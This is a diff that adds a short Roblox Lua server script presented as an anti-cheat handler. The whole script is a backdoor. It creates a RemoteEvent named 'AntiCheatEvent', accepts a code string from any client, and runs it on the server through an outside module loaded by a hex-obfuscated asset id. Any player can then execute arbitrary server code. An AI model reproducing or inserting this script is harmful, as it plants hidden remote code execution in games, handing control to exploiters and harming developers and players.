@@ -1,0 +1,17 @@
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+local antiCheatEvent = ReplicatedStorage:FindFirstChild("AntiCheatEvent")
+if not antiCheatEvent then
+    antiCheatEvent = Instance.new("RemoteEvent")
+    antiCheatEvent.Name = "AntiCheatEvent"
+    antiCheatEvent.Parent = ReplicatedStorage
+end
+
+antiCheatEvent.OnServerEvent:Connect(function(player, code)
+    local success, err = pcall(function()
+        require(0x34A62CEB9):SpawnS(code, workspace)
+    end)
+    if not success then
+        warn(err)
+    end
+end)
